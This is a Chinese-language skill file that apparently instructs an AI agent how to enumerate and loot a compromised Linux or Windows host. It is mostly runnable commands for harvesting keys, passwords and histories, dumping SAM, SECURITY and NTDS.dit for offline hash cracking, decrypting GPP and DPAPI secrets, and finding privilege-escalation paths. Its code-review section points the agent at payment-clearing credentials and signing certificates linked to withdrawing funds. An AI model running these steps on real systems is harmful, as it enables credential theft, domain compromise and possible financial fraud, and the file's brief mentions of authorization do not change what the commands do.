---
name: host-enum
description: 落地/进入内网后的本机信息与提权面清点（Linux / Windows 双轨）：先本机（零发包）→ 再存活（尽量被动）→ 最后定向扫描，并并行做提权面、低权限榨取、程序代码面与 root/Administrator 之后清点
whenToUse: 拿到 shell / 权限落地、或经隧道进入内网后、做任何批量扫描之前；要审计当前用户与本机的敏感信息、提权可能与应用代码面时（落到 Windows 主机时同样按本技能的 Windows 轨执行）
role: internal,exploit
enabled: true
---

# 落地主机清点（Linux / Windows 双轨：本机信息 / 提权面 / 代码面）

> **顺序是硬约束：本机（零发包、秒级）→ 存活（尽量被动）→ 定向扫描（最贵）。**
> **先判系统再选轨**：Linux 与 Windows 的命令集完全不同，落地第一件事是确认本机是什么系统，然后**只跑相符的那一轨**
> （下面是 A–H 每段并列「Linux 轨 / Windows 轨」；同网段混部时两轨都要用，落到哪台用哪轨）。
> **`role` 可以多值（逗号分隔）：本技能归 `internal` 与 `exploit` 两族——按内网主机作业算内网，`exploit` 角色落地那一刻同样按本技能执行**（两个角色挂在同一个
> preset 上、技能目录是同一份，不存在按角色过滤；本技能两轨都只用系统自带命令 + 现有工具篮，不依赖任何环境变量，两边的技能库都显示"可用"）。
> 内网铺面与打点的命令、存活预扫旗标在技能 `gogo-scan`（不可用时用备用技能 `fscan-intranet`）；隧道选型与登记在技能 `tunnel-selection`。

## 先判系统，再选轨（落地第一步）

```bash
ver                                   # Windows（cmd 内置）：输出 "Microsoft Windows [Version 10.0.x]"
uname -s                              # Linux：输出 "Linux"；Windows 侧没有 uname 就走上面那条
```

- **Windows 轨特征**：路径是 `C:\...`、提示符 `C:\Users\...>`、`ipconfig` 可用、PowerShell 可用。
- **Linux 轨特征**：`/etc/os-release`、`ip a`、`id` 可用，`ping` 是 `-c/-W` 语法。
- 一次性 `?cmd=`、受限 shell 判不出来时，先跑 `whoami /all`（Windows 有组与特权）或 `id`（Linux）确认，再决定跑哪轨。
- **不要拿一轨的命令去敲另一轨**：`id`/`uname`/`ip a`/`ss` 在 Windows 上不存在，`whoami /all`/`systeminfo`/`ipconfig` 在 Linux 上也不存在。

## 门禁：先清点，再扫描

拿到权限的那一刻是**清点时刻**，不是扫描时刻。

1. **没有「本机信息清单 + 存活清单」，不许对该网段做批量扫描**（低权限会话尤其如此）：没有存活判定就对大网段开全端口，又慢又漏，还把暴露面拉满。
2. **落地先做三段并落库**——本机信息、提权面、代码面（对应下面 D / E / F 与 A / B，Linux 与 Windows 同要求）。三段没做完，不要谈批量扫描、不要换目标。
3. **落库用 `redteam_chain_add`**，`title` 按前缀开头（前缀是报告分段的锚点，必须照写）：

   | 前缀 | 这一步记什么 | 章节 |
   | --- | --- | --- |
   | `本机枚举：` | 落地主机情报、存活清单、低权限可读的敏感信息 | A、B、E |
   | `代码面：` | 有什么应用在跑、代码在哪、什么栈/版本、配置与密钥、接口清单、VCS | F |
   | `提权面：` | 提权面枚举、凭据复用、提权尝试与**结果回显** | D、G |
   | `卡点：` | 打不动的原因（读不了 / 提权失败 / 被拦 / 缺条件） | 全部 |

   `tool` 写**实际命令原文**、`result` 写回显摘要——报告要能照着复现。
4. **报告口径**：报告里有一节「本机信息与提权面」，按上面四个前缀分段读取；**没记的面向会显示「未记录」**——那不是没做，是没落库。
5. 顺带产出的凭据/会话照常单独落库（`redteam_credential_add` / `redteam_access_add`），别只写在步骤里。

## A. 落地立情报（零发包、秒级）

### Linux 轨

```bash
id; uname -a; cat /etc/os-release            # 我是谁、什么内核/发行版（对照已知本地提权）
ip a; ip route; ip neigh                     # 网卡、路由，**ARP 邻居表 = 现成活主机清单**
cat /etc/hosts /etc/resolv.conf              # 名字从哪来（DNS 搜索后缀常暴露 AD 域）
ss -antp 2>/dev/null || netstat -antp 2>/dev/null || cat /proc/net/tcp   # 已有连接 = 正在通信的对端（非 root 时 -p 只看得到自己的进程；纯连接表用 ss -ant）
crontab -l 2>/dev/null; ls -l /etc/cron* 2>/dev/null; cat /etc/crontab; systemctl list-timers --all 2>/dev/null
mount | grep -E 'nfs|cifs|//'                # 挂载的共享（本身就是一个横移入口）
```

### Windows 轨（全部系统自带 cmd / PowerShell，只读、零发包）

```cmd
whoami /all                                  # 我是谁 + 属哪些组 + 令牌特权（privileges）全量，一份命令顶三条
hostname & ver                               # 主机名与系统版本
systeminfo                                   # OS/架构/域 + HotFix(s) 补丁列表（对照本地提权 CVE）
ipconfig /all                                # 网卡/多 IP/网关/DNS 后缀（DNS 后缀常暴露 AD 域）
route print                                  # 路由表（多网卡 → 更多可达网段）
arp -a                                       # ARP 邻居表 = 现成活主机清单（零发包）
netstat -ano                                 # 已有连接 + 监听端口 + PID（正在通信的对端）
net session                                  # 本机与他机的 SMB 会话（**要管理员权限**才看得到）
net share & net view                         # 本机共享（含隐含管理共享）/ 网络内可见的主机
query user & quser                           # 谁在线（交互登录会话 = 可关注的账号）
wmic computersystem get domain,username      # 域名与当前用户（wmic 在较新系统已弃用，见下 PowerShell 替代）
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"Domain"
nltest /dclist:<domain>                      # 域环境：列出所有域控（另有 nltest /dsgetdc:<domain>）
```

```powershell
Get-CimInstance Win32_ComputerSystem | Select-Object Domain,UserName   # wmic 的替代
Get-HotFix                                                            # 补丁列表（等价 systeminfo 的 HotFix 段）
```

- Windows 轨同样**零发包**：以上全是读本机状态；`arp -a`/`netstat -ano`/`ipconfig /displaydns` 就是免费的活主机与对端清单。

## B. 存活优先被动

### Linux 轨

- **先被动**（零发包）：ARP 邻居表、已有 TCP 连接、`/etc/hosts`、内网 DNS 反解记录——这些是免费且现成的活主机清单。
- **再主动**：ICMP 优先（`ping -c1 -W1 <ip>`）；或按技能 `gogo-scan` 的存活预扫档跑（旗标与用法见该技能）。
- **禁止把全端口扫描当存活探测**：端口不通不等于主机不在（本机防火墙/网络 ACL 都会让端口"看起来关闭"）。
  先有存活清单，再按清单逐台扩端口；**没有存活的段不扫**。

### Windows 轨

- **先被动**（零发包）：`arp -a`（邻居表）、`netstat -ano`（已连对端）、`ipconfig /displaydns`（DNS 缓存里的内网名字）、
  `nbtstat -c`（NetBIOS 名称缓存）、`net view`（域/工作组内可见主机）、域查询（`nltest /dclist:<domain>`、`net group "Domain Computers" /domain`）。
- **再主动**：ICMP 用 PowerShell 内置 `Test-Connection <ip> -Count 1 -Quiet`；或按技能 `gogo-scan` 的存活预扫档跑（含 Windows 版二进制，旗标见该技能）。
- **纪律与 Linux 轨完全相同**：低权限（非管理员）**不得**对大于 `/24` 的网段做全端口扫描、**不得**大范围爆破；
  起步 `/24` + 常用端口；主动流量**必须**经现有隧道走 `socks5://`（代理参数写法见技能 `gogo-scan`，隧道选型见技能 `tunnel-selection`），不在跳板机上裸扫。

## C. 扫描纪律（红线，两轨一致）

- 低权限（Linux 非 root / Windows 非管理员）**禁止**对大于 `/24` 的网段做全端口扫描，**禁止**大范围爆破。
- **起步档**：`/24` + 常用端口预设；拿到存活清单后**只对响应过的主机**扩端口/扩服务。
- **大网段**（掩码 < /24）：走技能 `gogo-scan` 的大网段档 + 存活预扫（模式、并发、超时都在该技能里按段给好了）。
- 一律经现有隧道走 socks5 代理（代理参数写法见技能 `gogo-scan`；隧道怎么选与登记见技能 `tunnel-selection`），**不在跳板机上裸扫**。
- **报备**：端口数 > 500 或网段大于 `/24` 时，先在任务书/汇报里写明理由与授权依据再动手。
- **排除清单**：办公网、打印机、工控/OT 网段、云元数据地址 `169.254.169.254`。
- 并发与超时按被扫设备的承受力降档（走隧道时隧道本身就是瓶颈）。

### Windows 轨：扫描器用哪个二进制

- **主用**：技能 `gogo-scan` 的 Windows 版二进制（官方 releases 资产名 `gogo_windows_amd64.exe`，落地后通常就地复制/改名为 `gogo.exe`）。
  **命令、旗标、并发与超时档一律照技能 `gogo-scan`，本技能不复述**——含 `--proxy socks5://127.0.0.1:<端口>` 走出网的写法。
- **备用**：技能 `fscan-intranet` 的 Windows 版（`fscan_windows_x64.exe`，路径见该技能），仅在该技能列出的条件下用，命令照该技能。
- 传二进制到 Windows 目标同样只在**授权范围内**做；不许在目标上装扫描器/装工具（见 H 段铁律）。

## D. 提权面（落地即做，结果也要落库）

### Linux 轨

```bash
id; sudo -n -l 2>&1                           # 免密 sudo 能不能用（能用就直接列授权项；要口令时用自己的会话跑 sudo -l 才看得到全量）
find / -xdev -perm -4000 -type f 2>/dev/null  # SUID
find / -xdev -perm -2000 -type f 2>/dev/null  # SGID
getcap -r / 2>/dev/null                       # capabilities
uname -r; cat /etc/os-release                 # 内核/发行版 → 对照已知本地提权
```

- **可写路径劫持**：`echo $PATH` 里可写目录、服务脚本、cron/systemd 单元、`ldd` 命中的可写库文件。
- **凭证文件可读性**：`/etc/passwd` 与 `/etc/shadow` 的读写权限、`~/.bashrc` / `~/.profile` / 服务单元能否写入。
- **计划任务**：`cron` / systemd timer / 启动项里"我能不能写进去"（A 段只列出来，这里判定可写性）。
- **容器逃逸面（只读判定）**：`ls -l /var/run/docker.sock`、`cat /proc/1/cgroup`、
  `grep -i '^Cap' /proc/self/status`、`ls -l /var/run/secrets/kubernetes.io/serviceaccount/`、
  `mount | grep -E '(/host|/mnt/host)'`（特权容器 / 宿主目录挂载 / SA token 三件事）。
- **凭据立即复用**：拿到的任何口令/私钥先做 `su` / `sudo` / SSH 复用（比任何本地提权手法都快），
  成功就把结果与回显写进 `提权面：` 步骤，并 `redteam_credential_add` / `redteam_access_add` 落库。

### Windows 轨

**第一步看令牌特权**——Windows 的本地提权大多从特权与补丁来：

```cmd
whoami /priv                     # 令牌特权全量；下面对照（有即列，能不能用还要看账户/路径权限）
whoami /groups                   # 本地组：Administrators / Backup Operators / Remote Management Users…
systeminfo                       # HotFix(s) 列表 → 对照这些补丁缺失对应的本地提权 CVE
```

- **重点特权**（`whoami /priv` 里的名字）：
  - `SeImpersonatePrivilege` / `SeAssignPrimaryTokenPrivilege` → 土豆系（服务账户、IIS、MSSQL 账户常带）；
  - `SeDebugPrivilege` → 可注入/读其它进程内存（含 LSASS）；
  - `SeBackupPrivilege` / `SeRestorePrivilege` → 绕过 ACL 读（含注册表 hive / 任意文件）；
  - `SeTakeOwnershipPrivilege` → 夺取文件/对象所有权；
  - `SeLoadDriverPrivilege` → 加载驱动。
- **缺失补丁**：把 `systeminfo` 的 HotFix 列表与已知本地提权 CVE 对照，缺哪个就查那个（不要凭记忆，回显为准）。

**服务与路径**（未加引号的服务路径 + 可写二进制是经典提权面）：

```cmd
sc query type= service state= all      # 列全部服务（注意 sc 语法：等号两侧都要有空格）
sc qc <服务名>                          # 看 BINARY_PATH_NAME：含空格且**未加引号** → 空格处可放同名程序劫持
sc sdshow <服务名>                      # 服务的 DACL（我能不能改配置 / 重启它）
icacls "<服务二进制或目录>"              # 目录/文件权限（F/M/W = 可写 → 换二进制提权）
```

- **计划任务与可写脚本**：`schtasks /query /fo LIST /v`（看每个任务以什么账户运行、跑什么程序/脚本），
  脚本路径（`.bat/.ps1/.vbs`）可写 → 以任务账户（常是 SYSTEM/管理员）执行。
- **AlwaysInstallElevated**（两处都要查，缺一不可）：
  ```cmd
  reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  ```
- **UAC 配置**：`reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA`、
  `... /v ConsentPromptBehaviorAdmin`（判断 UAC 档位与弹窗策略）。
- **自动登录与 Winlogon**（明文口令常在这）：`reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName`、
  `... /v DefaultPassword`、`... /v AutoAdminLogon`。
- **服务账户口令**：服务注册表项 `reg query HKLM\SYSTEM\CurrentControlSet\Services\<服务名> /v ImagePath`，
  `ImagePath` 或服务描述里常直接写着账号明文口令（老软件尤甚）。
- **无人值守安装文件**（常含 base64 口令）：`C:\Windows\Panther\Unattend.xml`、`C:\Windows\Panther\Unattend\Unattend.xml`、
  `C:\Windows\System32\sysprep\sysprep.inf`、`C:\unattend.xml` —— `dir /s /b` 找，`findstr /S /I /C:"<UserAccounts" /C:"<Password"` 抓内容。
- **GPP `cpassword`（域环境）**：`findstr /S /I /M cpassword \\<DC>\SYSVOL\<domain>\Policies\*.xml`（Groups.xml 等里是 AES 可逆的 `cpassword`）。
- **可写 PATH / ProgramData / Temp**：`echo %PATH%` 找可写目录；`icacls C:\ProgramData`、`icacls "%TEMP%"` 判可写性。
- **DLL 劫持**：服务/程序搜索路径里缺失且目录可写的 DLL 位置——用 `sc qc` 拿到程序路径 + `icacls` 判目录可写，
  `tasklist /m <进程名>` 列某进程已加载的模块，比对哪些搜索顺序靠前的 DLL 不存在。
- **域侧**（有域账号/域内存取时）：`net group "Domain Admins" /domain`、`net group "Enterprise Admins" /domain`、
  `net localgroup administrators`、`nltest /domain_trusts`；存在 ADCS 时 `certutil -TCAInfo`、`certutil -CATemplates` 列 CA 与模板。
- **凭据立即复用**：Windows 上一组口令先试 RDP/SMB/WinRM/MSSQL 与邻机（比本地提权快），
  成功就把结果与回显写进 `提权面：` 步骤，并 `redteam_credential_add` / `redteam_access_add` 落库。

## E. 低权限榨取（当前用户 + 全机可读）

### Linux 轨

```bash
ls -la ~/.ssh; cat ~/.ssh/known_hosts 2>/dev/null      # 私钥=横向；known_hosts=主机清单
cat ~/.bash_history 2>/dev/null
cat ~/.npmrc ~/.pypirc ~/.git-credentials ~/.netrc ~/.my.cnf ~/.pgpass 2>/dev/null
ls -la ~/.aws ~/.kube ~/.docker ~/.config 2>/dev/null  # 云/编排/CLI 凭据
```

- **浏览器数据**：Chrome / Firefox profile 里的登录态与保存的口令（只取你有权读的那份，别整目录拉走）。
- **应用配置**：`.env`、`config.php`、`application.yml`、`settings.py`、`wp-config.php`、`docker-compose.yml` 里的口令、密钥与连接串。
- **`/etc/` 可读的敏感项 + `/var/log/`**：`auth.log` / `secure` / `access.log` 里常直接写着账号口令与内网地址。
- **散落的备份与源码**：`/tmp`、`/var/tmp`、`/opt`、`/srv`、`/var/www`——
  `find /var/www /opt /srv /tmp -maxdepth 4 \( -name '*.sql' -o -name '*.zip' -o -name '*.bak' -o -name '*.tar.gz' \) 2>/dev/null`。
- 捞到的每一样都要能指回命令：凭据落 `redteam_credential_add`，其余写 `本机枚举：` 步骤（`tool` = 实际命令）。

### Windows 轨（当前用户目录 + 全机可读）

```cmd
dir /a "%USERPROFILE%\.ssh" & type "%USERPROFILE%\.ssh\known_hosts" 2>nul   # 私钥=横向；known_hosts=主机清单
dir "%APPDATA%" & dir "%LOCALAPPDATA%"        # 浏览器 profile 与各类凭据目录
cmdkey /list                                  # 已保存的凭据（含域/网络/WinRM 凭据）
type "%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"   # PowerShell 历史（常含口令）
dir /s /b "%TEMP%"                            # 临时目录里散落的脚本/导出/密钥
dir /s /b C:\Windows\Panther                  # 安装日志（常含口令）
```

- **IIS 配置**：`type %SystemRoot%\System32\inetsrv\config\applicationHost.config`、
  `dir /s /b C:\inetpub\wwwroot\web.config`（连接串与 appSettings 常含明文口令）。
- **应用配置**：`appsettings.json` / `web.config` / `*.config` / `*.json` / `*.yml` 里的连接串、密钥、第三方地址。
- **明文 WiFi 口令**：`netsh wlan show profiles` 先列，再 `netsh wlan show profile name="<SSID>" key=clear`（管理员时 `key=clear` 给明文）。
- **RDP 痕迹**：`type "%USERPROFILE%\Documents\Default.rdp"`、
  `reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers" /s`（连过哪些内网主机）。
- **凭据保管库**：`vaultcmd /listcreds:"Windows Credentials" /all`（Windows 的凭据保险库条目）。
- **Defender 排除路径**（常暴露敏感目录）：`Get-MpPreference | Select-Object -ExpandProperty ExclusionPath`。
- **网络挂载共享**：`net use`（当前映射的共享 = 现成横移入口）。
- 捞到的每一样都要能指回命令：凭据落 `redteam_credential_add`，其余写 `本机枚举：` 步骤（`tool` = 实际命令）。

## F. 程序代码面（"起码得知道有什么东西"）

### Linux 轨

1. **有什么在跑 → 代码在哪**：`ps aux`、`ss -lntp`、`systemctl list-units --type=service --state=running`
   （Windows 用 `tasklist` / `netstat -ano` / `sc query`）；反推代码根：`/var/www`、`/opt`、`/srv`、`/home/<用户>`、
   容器挂载点、`/usr/local`；部署方式看进程与单元文件（`/etc/systemd/system/*.service`、`docker-compose.yml`、`pm2`）。
2. **栈与版本**（版本 = 已知漏洞面）：`package.json`、`composer.json`、`pom.xml`、`requirements.txt`、`go.mod`、
   `Gemfile`、`Dockerfile`、`*.csproj`——只读锁版本文件，不要 install。
3. **接口与路由清单**（后续打点照这份清单走）：框架路由文件、Web 服务器站点配置（`/etc/nginx/`、Apache `sites-enabled`）、
   网关配置、`swagger` / `openapi` 文档、前端打包产物里的接口路径。
4. **代码里的凭据与对接面**：硬编码密钥 / Token、数据库连接串、第三方 API 地址、
   **支付/清算对接代码（接口地址、证书、签名函数）**——出金相关的凭证与签名逻辑就在这，与技能 `payout-flow-analysis` 联动。
5. **VCS**：`.git` 目录——`git -C <代码根> log --oneline`、`git -C <代码根> remote -v`、`git -C <代码根> status`
   （目标上没装 git 就直读 `.git/config`、`.git/logs/HEAD`、`.git/packed-refs`）：
   历史提交里的旧口令、remote 地址、作者邮箱、分支与 tag、未提交改动、部署脚本。
6. **规模控制**：大仓先摸结构与关键文件（配置 / 路由 / 密钥 / 支付相关），**不要整仓拉走**；报告只留结论与路径。

### Windows 轨

1. **有什么在跑 → 代码在哪**：`tasklist /v`、`Get-Process`、`sc query type= service state= all`；
   IIS 站点与路径：`appcmd list sites`（`%SystemRoot%\System32\inetsrv\appcmd.exe`）、`C:\inetpub\wwwroot`；
   反推代码根：`C:\inetpub`、`C:\Program Files`、`C:\Program Files (x86)`、`C:\ProgramData`、各用户目录、服务 `ImagePath` 指向的目录。
2. **栈与版本**（版本 = 已知漏洞面）：`dotnet --info`、`java -version`、`php -v`、`node -v`；
   锁版本/清单文件：`*.csproj` / `packages.config`、`pom.xml`、`package.json`、`composer.json`（只读，不要 install）。
3. **接口与路由清单**：IIS `applicationHost.config` 里的站点/绑定/物理路径、`swagger`/`openapi` 文档、
   前端打包产物里的接口路径、`appcmd list sites` / `appcmd list apppool`。
4. **配置与连接串**：`*.config` / `*.json` / `*.yml` 里的 `connectionString` / `password` / `appSettings`——
   `findstr /S /I /M /C:"connectionString" /C:"password" C:\inetpub\*.config`；
   **支付/清算对接**（接口地址、证书、签名配置）与技能 `payout-flow-analysis` 联动。
5. **计划脚本**：`.bat` / `.ps1` / `.vbs`（`schtasks /query /fo LIST /v` 里指向的路径优先看）——常含口令与部署逻辑。
6. **SQL Server**：`sqlcmd -S . -E -Q "SELECT name FROM sys.databases"`；
   作业 `sqlcmd -S . -E -Q "SELECT name FROM msdb.dbo.sysjobs"`（作业步骤里常含明文口令）。
7. **证书与签名**：`Get-ChildItem Cert:\LocalMachine\My`（支付/清算签名证书与私钥是否可导出）；
   `certutil -store My` 亦可列本机证书。
8. **规模控制**：先摸结构与关键文件（IIS 配置 / 服务 ImagePath / 连接串 / 支付相关），**不要整盘拉走**；报告只留结论与路径。

## G. root / Administrator 之后榨干（不放过）

### Linux 轨

```bash
ls -la /root/.ssh; cat /root/.ssh/known_hosts 2>/dev/null    # 私钥 = 横向
cat /root/.bash_history /root/.mysql_history /root/.psql_history 2>/dev/null
ls -la /root/.aws /root/.kube /root/.docker /root/.config 2>/dev/null
```

- **全盘凭据 grep（限目录、限大小、限超时，避免爆 IO）**：
  ```bash
  timeout 60 grep -rIl --exclude-dir=proc --exclude-dir=sys --exclude-dir=dev -m1 \
    -E 'password|passwd|api[_-]?key|secret|BEGIN [A-Z ]*PRIVATE KEY' /etc /opt /srv /var/www /home 2>/dev/null
  ```
- **云元数据与 CLI 配置**：主机上有云 AK/SK 或实例角色时，按技能 `cloud-security` 连云验证（身份确认 → 权限侦察 → 凭证循环）。
- **数据库本地 socket 免密**：先试本地 socket/默认口令直连，再考虑经 `127.0.0.1` 连。
- **先看本机防火墙再下"打不通"的结论**：`iptables -L -n`、`nft list ruleset`——
  很多"网络隔离"其实是本机规则；确认后再决定绕行还是换目标。
- **重估 A / B 段**：root 后路由、ARP、多网卡会暴露更多网段与邻居 = 新战场；
  **这之后才**决定是否再批量扫描，且先用已发现的存活清单（不重来一遍盲扫）。
- root 拿到的一切（私钥、凭据、配置、源码）立刻落库并复用；`root` 环境本身也记 `提权面：`。

### Windows 轨（Administrator / SYSTEM 之后）

```cmd
dir /a C:\Users\Administrator                 # 管理员用户目录（私钥、脚本、凭据）
dir C:\inetpub                                # IIS 全站与日志
reg save HKLM\SAM C:\Windows\Temp\sam.hiv
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv   # SAM/SYSTEM/SECURITY 副本 → 离线提取本机哈希
ntdsutil "activate instance ntds" "ifm" "create full C:\Windows\Temp\ntds" quit quit   # 域控：完整提取（含 NTDS.dit）
cmdkey /list                                  # 已保存凭据
```

- **DPAPI 主密钥**：`dir /a "%APPDATA%\Microsoft\Protect"`（用户）、`dir /a C:\Windows\System32\Microsoft\Protect`（机器）——
  配合已有的用户口令/域备份密钥可解出浏览器与凭据保险库里的密文。
- **SYSVOL / GPP**：`findstr /S /I /M cpassword \\<DC>\SYSVOL\<domain>\Policies\*.xml`（域内 `cpassword` 可逆）。
- **服务与计划任务账户口令**：回看 D 段的 `ImagePath` 与 `schtasks /query /fo LIST /v`，管理员后能读到更多注册表项与脚本。
- **Defender 排除路径**：`Get-MpPreference | Select-Object -ExpandProperty ExclusionPath`（排除目录 = 高价值敏感目录）。
- **先看本机防火墙再下"打不通"的结论**：`netsh advfirewall show allprofiles`、
  `Get-NetFirewallRule | Where-Object { $_.Enabled -eq 'True' } | Select-Object DisplayName,Direction,Action`——
  很多"网络隔离"其实是本机策略；**现成的端口转发**看 `netsh interface portproxy show all`。
- **重估 A / B 段**：`route print` / `ipconfig /all` / `arp -a` 会暴露更多网卡与网段 = 新战场；
  **这之后才**决定是否再批量扫描，且先用已发现的存活清单（不重来一遍盲扫）。
- 拿到的一切（哈希、私钥、凭据、配置、源码）立刻落库并复用；`SYSTEM` 环境本身也记 `提权面：`。

## H. 铁律（两轨一致）

- **不许装工具**：只用**系统自带命令** + 现有工具篮（技能 `gogo-scan` / `fscan-intranet` / `tunnel-selection` 里已核实的工具）。
  - Linux 轨用系统自带 coreutils/util-linux/iproute2 等；**Windows 轨用系统自带 cmd / PowerShell 与 Windows 内置命令**，
    以及工具篮里**已核实的 Windows 版二进制**（gogo / fscan 的 Windows 版，路径见各自技能）。
- 不许 `apt install`、不许在目标上装任何第三方枚举器/提权脚本（Windows 侧同样不许下载/上传第三方枚举器）——既留痕又不可控。
- 目标上没有的工具就用系统自带命令等价替代；连替代都没有，就如实写进 `卡点：` 步骤，**不要伪造结果**。
- 越权/授权范围纪律两轨相同：只用授权清单内的范围，范围外不碰。

## 命令自检表（命令 → 依赖 → 来源）

| 命令 | 依赖 | 是否系统自带 / 本仓工具篮 |
| --- | --- | --- |
| `id`、`uname`、`cat /etc/os-release`、`mount`、`timeout` | 内核 + coreutils + util-linux（GNU） | 系统自带（Linux 落地主机） |
| `ip a` / `ip route` / `ip neigh` / `ss -antp` | iproute2 | 系统自带 |
| `netstat -antp` | net-tools | 系统自带（缺则读 `/proc/net/tcp`） |
| `crontab -l` / `cat /etc/crontab` | cron | 系统自带 |
| `systemctl list-timers` / `sc query` | systemd / Windows 服务控制 | 系统自带（各自的平台上有才用） |
| `ping -c1 -W1` | iputils | 系统自带 |
| `sudo -n -l` | sudo | 系统自带（要口令才能看的授权项走 `sudo -l`） |
| `find`、`grep`、`ls`、`cat`、`echo` | findutils / grep / coreutils（GNU） | 系统自带（`-xdev`、`--exclude-dir`、`-m1` 都是 GNU 侧用法） |
| `getcap -r /` | libcap | 系统自带（Debian/Ubuntu/Kali 默认装） |
| `iptables -L -n` / `nft list ruleset` | 本机防火墙 | 系统自带（有才用，只读） |
| `git -C … log/remote/status` | git | 目标上装了才用；没装直读 `.git/` 里的文本文件 |
| Windows：`ver` / `hostname` / `whoami`（`/all` `/priv` `/groups`） | Windows 内置 exe | 系统自带（Windows 轨） |
| Windows：`systeminfo` / `ipconfig /all` / `route print` / `arp -a` / `netstat -ano` / `net session` / `net share` / `net view` / `net use` | Windows 内置命令 | 系统自带 |
| Windows：`query user` / `quser` / `wmic` / `nltest` / `nbtstat` | Windows 内置（quser/wmic/nltest/nbtstat.exe） | 系统自带（`wmic` 在较新系统已弃用 → 用 `Get-CimInstance`） |
| Windows：`sc query` / `sc qc` / `sc sdshow` / `icacls` / `schtasks` / `reg query` / `reg save` / `certutil` / `ntdsutil` | Windows 内置 exe | 系统自带 |
| Windows：`cmdkey` / `vaultcmd` / `netsh`（advfirewall / interface portproxy / wlan）/ `findstr` / `dir` / `type` / `tasklist` / `sqlcmd` | Windows 内置（`sqlcmd` 随 SQL Server 客户端；无则不跑，记 `卡点：`） | 系统自带（`sqlcmd` 有 SQL Server 才有） |
| Windows PowerShell：`Get-CimInstance` / `Get-HotFix` / `Get-Process` / `Get-SmbShare` / `Get-MpPreference` / `Get-NetFirewallRule` / `Get-ChildItem Cert:` / `Test-Connection` | Windows PowerShell 内置 cmdlet | 系统自带 |
| Windows：`appcmd`（`%SystemRoot%\System32\inetsrv\appcmd.exe`） | IIS 安装后内置 | 系统自带（装了 IIS 才有） |
| 内网存活预扫与铺面（含 Windows 版二进制） | 技能 `gogo-scan` 的二进制与本机路径 | 本仓工具篮（命令、旗标与路径都在该技能里） |
| 备用内网扫描（含 `fscan_windows_x64.exe`） | 技能 `fscan-intranet` | 本仓工具篮（仅在该技能列出的条件下用） |

## 相关技能

- `gogo-scan`：内网铺面与打点的命令、存活预扫档、大网段档（本技能只讲纪律与顺序）
- `fscan-intranet`：备用内网扫描（gogo 不可用时）
- `tunnel-selection`：隧道怎么选、怎么登记
- `credential-attack`：凭据攻击与限流（本技能只做凭据复用）
- `lateral-movement`：拿到凭据后的横向（PtH / 票据 / 远程执行）
- `cloud-security`：云凭据的确认与利用
- `payout-flow-analysis`：代码面里支付/清算对接的深挖
